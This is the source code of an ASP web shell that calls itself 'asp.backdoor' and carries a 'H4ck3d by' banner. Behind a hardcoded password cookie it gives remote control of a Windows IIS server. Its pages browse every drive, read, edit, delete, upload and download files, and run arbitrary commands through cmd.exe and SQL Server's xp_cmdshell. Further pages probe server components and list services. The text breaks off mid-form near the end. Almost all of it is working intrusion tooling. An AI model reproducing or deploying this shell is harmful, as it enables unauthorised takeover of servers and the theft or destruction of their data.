<style>

	.tr1{ BACKGROUND-color:gray }
	td {FONT-SIZE:9pt;FONT-FAMILY:"Tahoma","Arial","Helvetica","sans-serif";}
	.td1{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:silver;}
	.td2{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey;}
	.td3{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:gainsboro;}
	.table1{BORDER:gray 0px ridge;}
	.table2{BORDER:silver 0px ridge;}
	.showMenu{BORDER:silver 0px double;}
</style>

<%@ LANGUAGE = VBScript.Encode  codepage ="936" %>
<%Server.ScriptTimeOut=5000%>
<object runat=server id=oFileSys scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<%
on error resume next
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
	strForm=lcase(strForm)
	if not objForm.exists(strForm) then
		Form=""
	else
		Form=objForm(strForm)
	end if
end function

Public function File(strFile)
	strFile=lcase(strFile)
	if not objFile.exists(strFile) then
		set File=new FileInfo
	else
		set File=objFile(strFile)
	end if
end function


Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  dim iFindStart,iFindEnd
  dim iFormStart,iFormEnd,sFormName
  Version="HTTP上传程序 Version 2.0  By:tian~!"
  set objForm=Server.CreateObject("Scripting.Dictionary")
  set objFile=Server.CreateObject("Scripting.Dictionary")
  if Request.TotalBytes<1 then Exit Sub
  set tStream = Server.CreateObject("adodb.stream")
  set Data_5xsoft = Server.CreateObject("adodb.stream")
  Data_5xsoft.Type = 1
  Data_5xsoft.Mode =3
  Data_5xsoft.Open
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
  Data_5xsoft.Position=0
  RequestData =Data_5xsoft.Read 

  iFormStart = 1
  iFormEnd = LenB(RequestData)
  vbCrlf = chrB(13) & chrB(10)
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
  iStart = LenB (sStart)
  iFormStart=iFormStart+iStart+1
  while (iFormStart + 10) < iFormEnd 
	iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
	tStream.Type = 1
	tStream.Mode =3
	tStream.Open
	Data_5xsoft.Position = iFormStart
	Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
	tStream.Position = 0
	tStream.Type = 2
	tStream.Charset ="gb2312"
	sInfo = tStream.ReadText
	tStream.Close
	iFormStart = InStrB(iInfoEnd,RequestData,sStart)
	iFindStart = InStr(22,sInfo,"name=""",1)+6
	iFindEnd = InStr(iFindStart,sInfo,"""",1)
	sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
	if InStr (45,sInfo,"filename=""",1) > 0 then
		set theFile=new FileInfo
		iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr(iFindStart,sInfo,"""",1)
		sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileName=getFileName(sFileName)
		theFile.FilePath=getFilePath(sFileName)
		iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr(iFindStart,sInfo,vbCr)
		theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileStart =iInfoEnd
		theFile.FileSize = iFormStart -iInfoEnd -3
		theFile.FormName=sFormName
		if not objFile.Exists(sFormName) then
		  objFile.add sFormName,theFile
		end if
	else
		tStream.Type =1
		tStream.Mode =3
		tStream.Open
		Data_5xsoft.Position = iInfoEnd 
		Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
		tStream.Position = 0
		tStream.Type = 2
		tStream.Charset ="gb2312"
	        sFormValue = tStream.ReadText 
	        tStream.Close
		if objForm.Exists(sFormName) then
		  objForm(sFormName)=objForm(sFormName)&", "&sFormValue		  
		else
		  objForm.Add sFormName,sFormValue
		end if
	end if
	iFormStart=iFormStart+iStart+1
	wend
  RequestData=""
  set tStream =nothing
End Sub

Private Sub Class_Terminate  
 if Request.TotalBytes>0 then
	objForm.RemoveAll
	objFile.RemoveAll
	set objForm=nothing
	set objFile=nothing
	Data_5xsoft.Close
	set Data_5xsoft =nothing
 end if
End Sub
   
 
 Private function GetFilePath(FullPath)
  If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
  Else
   GetFilePath = ""
  End If
 End  function
 
 Private function GetFileName(FullPath)
  If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
  Else
   GetFileName = ""
  End If
 End  function
End Class

Class FileInfo
  dim FormName,FileName,FilePath,FileSize,FileType,FileStart
  Private Sub Class_Initialize 
    FileName = ""
    FilePath = ""
    FileSize = 0
    FileStart= 0
    FormName = ""
    FileType = ""
  End Sub
  
 Public function SaveAs(FullPath)
    dim dr,ErrorChar,i
    SaveAs=true
    if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
    set dr=CreateObject("Adodb.Stream")
    dr.Mode=3
    dr.Type=1
    dr.Open
    Data_5xsoft.position=FileStart
    Data_5xsoft.copyto dr,FileSize
    dr.SaveToFile FullPath,2
    dr.Close
    set dr=nothing 
    SaveAs=false
  end function
  End Class
httpt = Request.ServerVariables("server_name")
rseb=Request.ServerVariables("SCRIPT_NAME")
q=request("q")
if q="" then q=rseb
select case q
case rseb
if Epass(trim(request.form("password")))="^sawzdqg|~" then 
response.cookies("password")="fuckme" 
response.redirect rseb & "?q=list.asp" 
else %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=httpt%></title>
</head>

<body>
<%if request.form("password")<>"" then 
response.write "password error"
end if
 %>

<table width="100%" height="89" border="0" cellpadding="0" cellspacing="0"
bordercolorlight="#000000" bordercolordark="#F2F2F9" class="table2">
  <tr>
    <td width="100%" height="31">
<p align="center">  <%=httpt%></td>
  </tr>
  <tr> 
    <td width="100%" height="46">
<form method="POST" action="<%=rseb%>?q=<%=rseb%>">
        <div align="center">
          <center>
            <p>PassWord：              <input name="password" type="password" class="td3"
      style="border-left: thin none; border-right: thin none; border-top: thin outset; border-bottom: thin outset"
      size="20">
              <input type="submit" value="Enter" name="B1"
      style="font-size: 9pt; border: thin outset">
            </p>
          </center>
        </div>
        <div align="center">H4ck3d by 小偷
          <center>
            <p>&nbsp;</p>
          </center>
        </div>
    </form></td>
  </tr>
</table>
</body>
</html>

<%end if%>

<%case "down.asp"
call downloadFile(request("path"))
function downloadFile(strFile)
strFilename = strFile
Response.Buffer = True
Response.Clear%>
<object runat=server id=s scope=page classid="clsid:00000566-0000-0010-8000-00AA006D2EA4"></object>
<%s.Open
s.Type = 1
 if not oFileSys.FileExists(strFilename) then
  Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
  Response.End
 end if
 Set f = oFileSys.GetFile(strFilename)
 intFilelength = f.size
 s.LoadFromFile(strFilename)
 if err then
  Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
  Response.End
 end if
 Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
 Response.AddHeader "Content-Length", intFilelength
 Response.CharSet = "UTF-8"
 Response.ContentType = "application/octet-stream"
 Response.BinaryWrite s.Read
 Response.Flush
 s.Close
 Set s = Nothing
 response.end
End Function 
%>
<%case "list.asp"%>
<%
urlpath=server.urlencode(path)
if Request.Cookies("password")="fuckme" then 
dim cpath,lpath
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
Sub GetFolder()
dim theFolder,theSubFolders
if oFileSys.FolderExists(cpath)then
 Set theFolder=oFileSys.GetFolder(cpath)
 Set theSubFolders=theFolder.SubFolders
Response.write"<a href='" & rseb & "?q=list.asp&path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>回上级目录</font></a><br><script language=vbscript>"
For Each x In theSubFolders
%>so "<%=lpath%>","<%=x.Name%>","<%=request("path")%>","<%=attrib%>"
<%
Next
%></script><%
end if
End Sub

Sub GetFile()
dim theFiles
if oFileSys.FolderExists(cpath)then
 Set theFolder=oFileSys.GetFolder(cpath)
 Set theFiles=theFolder.Files
Response.write"<table border='0' width='100%' cellpadding='0'><script language=vbscript>" 
For Each x In theFiles
if Request("attrib")="true" then
showstring=x.Name
else
showstring=x.Name
end if
 %>sf "<%=showstring%>","<%=x.size%>","<%=x.type%>","<%=x.Attributes%>","<%=x.DateLastModified%>","<%=lpath%>","<%=x.name%>","<%=attrib%>","<%=x.name%>"
<% 
Next
end if
 Response.write"</script></table>"
End Sub
%>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=httpt%></title>
<style type="text/css">
<!--
table{ font-family: 宋体; font-size: 9pt }
a{ font-family: 宋体; font-size: 9pt; color: rgb(0,32,64); text-decoration: none }
a:hover{ font-family: 宋体; color: rgb(255,0,0); text-decoration: none }
a:visited{ color: rgb(128,0,0) }
td {  font-size: 9pt}
a {  color: #000000; text-decoration: none}
a:hover {  text-decoration: underline}
.tx {  height: 16px; width: 30px; border-color: black black #000000; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 1px; border-left-width: 0px; font-size: 9pt; background-color: #eeeeee; color: #0000FF}
.bt {  font-size: 9pt; border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px; height: 16px; width: 80px; background-color: #eeeeee; cursor: hand}
.tx1 { height: 18px; width: 60px; font-size: 9pt; border: 1px solid; border-color: black black #000000; color: #0000FF}
-->
</style>
</head>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("请输入文件名!");}
else {window.open("<%=rseb%>?q=edit.asp&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("请输入文件名!");}
else {window.open("<%=rseb%>?q=edir.asp&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub sf(showstring,size,type1,Attributes,DateLastModified,lpath,xname,attrib,name)
document.write "<tr style=""color: #000000; background-color: #FFefdf; text-decoration: blink; border: 1px solid #000080"" onMouseOver=""this.style.backgroundColor = '#FFCC00'"" onMouseOut=""this.style.backgroundColor = '#FFefdf'""><td width='50%'><font color='#FF8000'><font face=Wingdings>+</font></font><a href='"& urlpath & lpath & xName &"' target='_blank'><strong>" & showstring & "</strong></a></td><td width='20%' align='right'>" & size & "byte</td><td width='30%'><a href='#' title='type：" & type1 & chr(10) & "attr：" & Attributes & chr(10) & "time：" & DateLastModified &"'>attr</a> <a href='<%=rseb%>?q=edit.asp&path=" & lpath & xName & "&attrib=" & attrib &"' target='_blank' ><font color='#FF8000' ></font>edit</a> <a href="&chr(34)&"javascript: rmdir1('"& lpath & xName &"')"&chr(34)&"><font color='#FF8000' ></font>del</a> <a href='#' onclick=copyfile('" & lpath & Name & "')><font  color='#FF8000' ></font>copy</a> <a href='<%=rseb%>?q=down.asp&path=<%=cpath%>\"&xName&"&attrib=" & attrib &"' target='_blank' ><font color='#FF8000' ></font>down</a></td></tr>"
end sub
sub so(lpath,xName,path,attrib)
document.write "<a href='<%=rseb%>?q=list.asp&path="& lpath & xName & "&oldpath=" & path & "&attrib=" & attrib &"'>└<font color='#FF8000'><font face=Wingdings>1</font></font>  " & xName &"</a> <a href="&chr(34)&"javascript: rmdir('"& lpath & xName &"')"&chr(34)&"><font color='#FF8000' ></font>del</a><br>"
end sub

sub rmdir1(ls)
if confirm("你真的要删除这个文件吗!"&Chr(13)&Chr(10)&"文件为："&ls)   then
window.open("<%=rseb%>?q=edit.asp&path=" & ls & "&op=del&attrib=<%=request("attrib")%>")
end if
end sub

sub rmdir(ls)
if confirm("你真的要删除这个目录吗!"&Chr(13)&Chr(10)&"目录为："&ls)   then
window.open("<%=rseb%>?q=edir.asp&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub

sub copyfile(sfile)
dfile=InputBox("※文件复制※"&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"输入目标文件的文件名:"&Chr(13)&Chr(10)&"[允许带路径,要根据你的当前路径模式]")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then 
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "对不起，你在相对路径模式下不能使用绝对路径"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=rseb%>?q=edit.asp&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"您没有输入文件名！"
end If
end sub
</script>
<body>
<table width="100%" height="163" border="0" cellpadding="2" cellspacing="2" bordercolorlight="#000000"
bordercolordark="#FFFFFF" bgcolor="#999999">
  <tr>
   
  </tr>
  <tr>
    <td width="751" colspan="2" bgcolor="#FFFFFF">Switch：<span
    style="background-color: rgb(255,255,255);color:rgb(255,0,0)">
      <%
For Each thing in oFileSys.Drives
Response.write "<font face=Wingdings>:</font><a href='" & rseb & "?q=list.asp&path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&":</a>"
NEXT
set oScriptNet=Server.CreateObject("WScript.Network")
%> </span>&nbsp; user：
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %></td>
  </tr>
  <tr>
    <td width="751" colspan="2" bgcolor="#FFFFFF">※
    <%
if Request("attrib")="true"  then
response.write "<a href='" & rseb & "?q=list.asp'>Switch to now</a>"
else
response.write "<a href='" & rseb & "?attrib=true&q=list.asp'>Switch to Path</a>"
end if
%>&nbsp;Path:<span
    style="background-color: rgb(255,255,255)"><%=cpath%></span></td>
  </tr>
  <tr>
<td width="751" colspan="2" bgcolor="#FFFFFF">※<font face=Wingdings><A href="./search?lang=utf-8&amp;s=now" class="style1">now</A><font color="#FF8000">1</font></font>:<span style="background-color: rgb(255,255,255)"><%=lpath%></span> </td>
  </tr><form name="form1" method="post" action="<%=rseb%>?q=upfile.asp" target="_blank" enctype="multipart/form-data">
  <tr>
    <td colspan="2" bgcolor="#FFFFFF" style="height: 20px">

Edit|
  <input class="tx1" type="text" name="filename" size="20">
<input class="tx1" type="button" value="New File" onclick="crfile(form1.filename.value)">
<input type="button" class="tx1" onclick="crdir(form1.filename.value)" value="New Dir">
<input type="file" name="file1" class="tx1" style="width:100" value="">
<input type="text" name="filepath" class="tx1" style="width:100" value="<%=cpath%>">
<input type="hidden" name="act" value="upload">
<input type="hidden" name="upcount" class="tx" value="1">
<input class="tx1" type="submit" value="up">
<input class="tx1" type="button" onclick="window.open('<%=rseb%>?q=cmd.asp','_blank')"  value="cmd">
<input class="tx1" type="button" onclick="window.open('<%=rseb%>?q=test.asp','_blank')"  value="config">
<input class="tx1" type="button" onclick="window.open('<%=rseb%>?q=p.asp','_blank')"  value="nsfo">
<input class="tx1" type="button" onclick="window.open('<%=rseb%>?q=server.asp','_blank')"  value="server">
<input class="tx1" type="button" onclick="window.open('<%=rseb%>?q=sql.asp','_blank')"  value="sql">
</td>
   </td>
  </tr></form>
  <tr>
    <td width="169" valign="top" bgcolor="#FFFFFF"><%Call GetFolder()%>
</td>
    <td width="582" valign="top" bgcolor="#FFFFFF"><%Call GetFile()%>
</td>
  </tr>
</table>
<p>
  <%else
response.write "Password Error!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
end if
%>
</p>
<p>&nbsp;	</p>
<p align="center">Modified by lanlong</p>
</body>
</html>
<%case "edit.asp"%>
<html>

<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
<title>编辑源代码</title>
<style>
<!--
table{ font-family: 宋体; font-size: 12pt }
a{ font-family: 宋体; font-size: 12pt; color: rgb(0,32,64); text-decoration: none }
a:hover{ font-family: 宋体; color: rgb(255,0,0); text-decoration: underline }
a:visited{ color: rgb(128,0,0) }
-->
</style>
</head>

<body>
<% '读文件
if Request.Cookies("password")="fuckme" then 
if request("op")="del"  then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set thisfile = oFileSys.GetFile(whichfile)
thisfile.Delete True
Response.write "<script>alert('删除成功！要刷新才能看到效果');window.close();</script>"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if 
Set thisfile = oFileSys.GetFile(whichfile)
thisfile.copy dsfile
%>
<script language=vbscript>
msgbox "源文件：<%=whichfile%>" & vbcrlf & "目的文件:<%=dsfile%>" & vbcrlf & "复制成功！要刷新才能看到效果!"
window.close()
</script>
<%
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set thisfile = oFileSys.OpenTextFile(whichfile, 1, False)
 counter=0
 thisline=thisfile.readall
 thisfile.Close
 set fs=nothing
end if
%>

<form method="POST" action="<%=rseb%>?q=edit.asp">
  <input type="hidden" name="attrib" value="<%=Request("attrib")%>"><table border="0"
  width="700" cellpadding="0">
    <tr>
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p><%=httpt%></td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA">文件名：<input type="text" name="path" size="45"
      value="<%=Request("path")%> ">直接更改文件名，相当于“另存为”</td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><textarea rows="25" name="text" cols="90"><%=thisline%></textarea></td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p><input type="submit"
      value="提交" name="B1"><input type="reset" value="复原" name="B2"></td>
    </tr>
  </table>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set outfile=oFileSys.CreateTextFile(whichfile)
 outfile.WriteLine Request("text")
 outfile.close 
 set fs=nothing
Response.write "<script>alert('修改成功！要刷新才能看到效果');window.close();</script>"
end if
end if
end if
else
response.write "Password Error!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
end if


%>
</body>
</html>
<%case "edir.asp"%>
<html>

<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
<title>目录操作</title>
<style>
<!--
table{ font-family: 宋体; font-size: 12pt }
a{ font-family: 宋体; font-size: 12pt; color: rgb(0,32,64); text-decoration: none }
a:hover{ font-family: 宋体; color: rgb(255,0,0); text-decoration: underline }
a:visited{ color: rgb(128,0,0) }
-->
</style>
</head>

<body>
<% '读文件
if Request.Cookies("password")="fuckme" then 

if request("op")="del"  then

if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if 
oFileSys.DeleteFolder whichdir,True
Response.write "<script>alert('删除的目录为:" & whichdir & "删除成功！要刷新才能看到效果');window.close();</script>"

else

if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if 
oFileSys.CreateFolder whichdir
Response.write "<script>alert('建立的目录为:" & whichdir & "建立成功！要刷新才能看到效果');window.close();</script>"
end if
end if
else
response.write "Password Error!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
end if
%>
</body>
</html>
<%
case "upfile.asp"
if Request.Cookies("password")="fuckme" then 
set upload=new upload_5xSoft
if upload.form("filepath")="" then
 HtmEnd "请输入要上传至的目录!"
 set upload=nothing
 response.end
else
 formPath=upload.form("filepath")
 if right(formPath,1)<>"/" then formPath=formPath&"/" 
end if

iCount=0
for each formName in upload.objFile
 set file=upload.file(formName)
 if file.FileSize>0 then
  file.SaveAs formPath & file.FileName
  response.write file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" 成功!<br>"
  iCount=iCount+1
 end if
 set file=nothing
next
set upload=nothing
Htmend iCount&" 个文件上传结束!"

sub HtmEnd(Msg)
 set upload=nothing
 Response.write "上传完毕！要刷新才能看到效果！<P><input value=关闭 type=button onclick=window.close();>"
 response.end
end sub
else
response.write "Password Error!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
end if

case "cmd.asp"

if Request.Cookies("password")<>"fuckme" then 
response.write "tiantiancuowu!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
else%>
<title>ASP Shell</title>
 <HTML>
 <BODY>
 <FORM action="<%=rseb%>?q=cmd.asp" method="POST">
 <input type=text name=".CMD" size=45 value="<%= szCMD %>">
 <input type=submit value="执行命令">
 </FORM>
 <PRE>
</BODY>
</HTML>
<%
set oScript=Server.CreateObject("WScript.Shell")
   On Error Resume Next
   szCMD = Request.Form(".CMD")
   If (szCMD <> "") Then
   response.write oScript.exec ("cmd.exe /c "& szCMD).stdout.readall
End If
end if
case "sql.asp"
if Request.Cookies("password")<>"fuckme" then 
response.write "Password Error!"
response.write "<a href='" & rseb & "?q=" & rseb & "'>【返 回】</a>"
else
If trim(request.form("sqlcmd"))<>""  Then
password= trim(Request.form("pa"))
id=trim(Request.form("id"))
SqlLocalName=trim(Request.form("SqlLocalName"))
if SqlLocalName="" or SqlLocalName="sql服务器地址" then SqlLocalName="127.0.0.1"
set adoConn=Server.CreateObject("ADODB.Connection") 
adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id&";Data Source ="&SqlLocalName
  strQuery = "exec master.dbo.xp_cmdshell '" & request.form("sqlcmd") & "'" 
  set recResult = adoConn.Execute(strQuery) 
  If NOT recResult.EOF Then 
   Do While NOT recResult.EOF 
    strResult = strResult & chr(13) & recResult(0) 
    recResult.MoveNext 
   Loop 
  End if 
  set recResult = Nothing 
  strResult = Replace(strResult," ","&nbsp;") 
  strResult = Replace(strResult,"<","&lt;") 
  strResult = Replace(strResult,">","&gt;") 
  strResult = Replace(strResult,chr(13),"<br>") 
 End if 
 set adoConn = Nothing 
%><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8">
<tr bgcolor="#EEEEEE" height=18 class="noborder">
<form name="form" method=post action="<%=rseb%>?q=sql.asp"> 
<input type="text" name="sqlcmd" size=70 > <br>
<input type="text" name="id" size=10 value="mssql用户名">
<input type="text" name="pa" size=20 value="mssql密码">
<input type="text" name="SqlLocalName" size=20 value="sql服务器地址">
<input type="submit" value="执行命令">
</form></tr></table>
<% 
Response.Write request.form("sqlcmd") & "<br><br>" 
Response.Write strResult 
end if
case "test.asp"
Response.Buffer = False
public IsObj,VerObj,TestObj
dim i
for i=0 to 25
	on error resume next
	IsObj=false
	VerObj=""
	TestObj=""
	set TestObj=server.CreateObject(ObjTotest(i,0))
	If -2147221005 <> Err then
		IsObj = True
		VerObj = TestObj.version
		if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
	end if
	ObjTotest(i,2)=IsObj
	ObjTotest(i,3)=VerObj
next
sub ObjTest(strObj)
	on error resume next
	IsObj=false
	VerObj=""
	TestObj=""
	set TestObj=server.CreateObject (strObj)
	If -2147221005 <> Err then
		IsObj = True
		VerObj = TestObj.version
		if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
	end if	
End sub
%>
<HTML>
<HEAD>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<TITLE>ASP探针V1.60</TITLE>
<style>
<!--
BODY
{
	FONT-FAMILY: 宋体;
	FONT-SIZE: 9pt
}
TD
{
	FONT-SIZE: 9pt
}
A
{
	COLOR: #000000;
	TEXT-DECORATION: none
}
A:hover
{
	COLOR: #3F8805;
	TEXT-DECORATION: underline
}
.input
{
	BORDER: #111111 1px solid;
	FONT-SIZE: 9pt;
	BACKGROUND-color: #F8FFF0
}
.backs
{
	BACKGROUND-COLOR: #3F8805;
	COLOR: #ffffff;

}
.backq
{
	BACKGROUND-COLOR: #EEFEE0
}
.backc
{
	BACKGROUND-COLOR: #3F8805;
	BORDER: medium none;
	COLOR: #ffffff;
	HEIGHT: 18px;
	font-size: 9pt
}
.fonts
{
	COLOR: #3F8805
}
-->
</STYLE>
</HEAD>
<BODY>
ASP探针-V1.60 服务器参数
<table border=0 width=450 cellspacing=0 cellpadding=0 bgcolor="#3F8805">
<tr><td>

	<table border=0 width=450 cellspacing=1 cellpadding=0>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器名</td><td>&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器IP</td><td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器端口</td><td>&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器时间</td><td>&nbsp;<%=now%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;IIS版本</td><td>&nbsp;<%=Request.ServerVariables("SERVER_SOFTWARE")%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;脚本超时时间</td><td>&nbsp;<%=Server.ScriptTimeout%> 秒</td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;本文件路径</td><td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器CPU数量</td><td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> 个</td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器解译引擎</td><td>&nbsp;<%=ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion %></td>
	  </tr>
	  <tr bgcolor="#EEFEE0" height=18>
		<td align=left>&nbsp;服务器操作系统</td><td>&nbsp;<%=Request.ServerVariables("OS")%></td>
	  </tr>
	</table>

</td></tr>
</table>
<br>
<font class=fonts>组件支持情况</font>
<%
Dim strClass
	strClass = Trim(Request.Form("classname"))
	If strClass<>"" or strClas1<>"" then
	Response.Write "<br>您指定的组件的检查结果："
	Dim Verobj1
	ObjTest(strClass)
	  If Not IsObj then 
		Response.Write "<br><font color=red>很遗憾，该服务器不支持 " & strclass & " 组件！</font>"
	  Else
		if VerObj="" or isnull(VerObj) then 
			Verobj1="无法取得该组件版本"
		Else
			Verobj1="该组件版本是：" & VerObj
		End If
		Response.Write "<br><font class=fonts>恭喜！该服务器支持 " & strclass & " 组件。" & verobj1 & "</font>"
	  End If
	  Response.Write "<br>"
	end if
	%>
<font class=fonts>其他组件支持情况检测</font><br>
在下面的输入框中输入你要检测的组件的ProgId或ClassId。
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#3F8805" width="450">
<FORM action=<%=rseb%>?q=test.asp method=post id=form1 name=form1>
	<tr height="18" class=backq>
		<td align=center height=30><input class=input type=text value="" name="classname" size=40>
<INPUT type=submit value=" 确 定 " class=backc id=submit1 name=submit1>
<INPUT type=reset value=" 重 填 " class=backc id=reset1 name=reset1> 
</td>
	  </tr>
</FORM>
</table>
<%case "server.asp"%>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="table2" ID="Table4">
	<tr><td colspan="2" class="td1"><FONT face="webdings">&nbsp;8</FONT>&nbsp;进程 :::...</td></tr>
	<%
		on error resume next
		
		set domainObject = GetObject("WinNT://.")
		
		for each obj in domainObject
			if lcase(mid(obj.path,4,3))="win" then
				Response.write("<tr><td width=""150"" class=""td2"">&nbsp;"&obj.Name&"</td><td class=""td3"">&nbsp;"&obj.DisplayName &"</td></tr>"&"<tr><td class=""td3""></td><td class=""td1"">&nbsp;"&obj.path&"</td></tr>")
			else
				Response.write("<tr><td width=""150"" class=""td2"">&nbsp;"&obj.Name&"</td><td class=""td3"">&nbsp;"&obj.DisplayName &"</td></tr>"&"<tr><td class=""td3""></td><td class=""td1"">&nbsp;<font color=#FF0000>"&obj.path& "</font></td></tr>")
			end if
		next
	%>
</TABLE>
<%case "p.asp"%>
<%if Request.Cookies("password")="fuckme" then %>
<%response.write "<font class=fonts>每次一个操作</font>" %>
当前时间:<%response.write now()%><BR>程序所在的物理路径：
<%response.write request.servervariables("APPL_PHYSICAL_PATH")%>
<html>
<title>asp.backdoor </title>

<body bgcolor="#C0C0C0" text="#000000">
<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#EEEEEE" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
<form action="<%= Request.ServerVariables("URL") %>?q=p.asp" method="post">
<input type=text name=text value="<%=DSnXA %>">  <font class=fonts>输入要浏览的目录,最后要加\</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
<input type=text name=text1 value="<%=DSnXA1 %>">
copy
